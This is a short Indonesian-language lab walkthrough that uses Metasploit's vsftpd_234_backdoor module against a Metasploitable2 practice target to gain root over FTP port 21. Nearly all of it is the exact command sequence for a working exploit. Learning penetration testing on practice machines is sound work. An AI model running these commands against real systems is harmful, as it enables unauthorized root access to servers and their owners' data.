# Exploit Port 21 (FTP)
- Buka msfconsole di terminal
```sh
msfconsole
```

- Cari modul untuk exploit `vsftpd 2.3.4`
```sh
search vsftpd 2.3.4
```

- Gunakan modul `exploit/unix/ftp/vsftpd_234_backdoor` untuk exploit `vsftpd 2.3.4`
```sh
use exploit/unix/ftp/vsftpd_234_backdoor
```

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini hanya terdapat 2 parameter yaitu `RHOSTS` dan `RPORT` yang secara default terisi 21
```sh
show options
```

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

- Jalankan modul exploit
```sh
exploit
```

- Setelah payload berhasil dijalankan di dapat akses root

